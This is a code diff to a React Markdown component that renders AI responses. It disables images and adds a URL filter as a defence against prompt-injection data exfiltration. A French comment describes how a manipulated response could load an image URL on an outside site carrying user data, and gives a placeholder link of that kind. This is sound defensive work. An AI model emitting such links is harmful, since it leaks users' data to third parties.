@@ -31,7 +31,25 @@ const components = {
         <th className="border border-gray-200 bg-gray-100 px-2 py-1 text-left font-semibold" {...props} />
     ),
     td: (props) => <td className="border border-gray-200 px-2 py-1 align-top" {...props} />,
+    // Images Markdown désactivées : une réponse manipulée (injection de consignes dans le document)
+    // pourrait sinon faire charger ![](https://site-externe/?donnees=…) et exfiltrer des données.
+    // Seul le texte alternatif est affiché. Les images générées passent par un champ dédié (ex.image).
+    img: ({ alt }) => (alt ? <span>{alt}</span> : null),
 };
+
+// Liens autorisés : http(s), mailto et adresses relatives / ancres ; tout le reste est neutralisé.
+function safeUrl(url, key) {
+    if (key === "src") return "";
+    const value = String(url || "").trim();
+    // Barres obliques inverses : « /\hote » est interprété comme « //hote » par les navigateurs.
+    if (value.includes("\\")) return "";
+    if (/^(https?:|mailto:)/i.test(value)) return value;
+    // Relatif (« /… », « ./… », « #… », « ?… ») mais pas « //hote » (protocole implicite).
+    if (/^(\/(?!\/)|\.\.?\/|#|\?)/.test(value)) return value;
+    // Pas de schéma du tout (ex. « page.html ») : relatif également.
+    if (value && !/^[a-z][a-z0-9+.-]*:/i.test(value) && !value.startsWith("//")) return value;
+    return "";
+}
 
 export default function AiMarkdown({ children }) {
     return (
@@ -40,6 +58,7 @@ export default function AiMarkdown({ children }) {
                 remarkPlugins={[remarkGfm, remarkMath]}
                 rehypePlugins={[rehypeKatex]}
                 components={components}
+                urlTransform={safeUrl}
             >
                 {children}
             </ReactMarkdown>
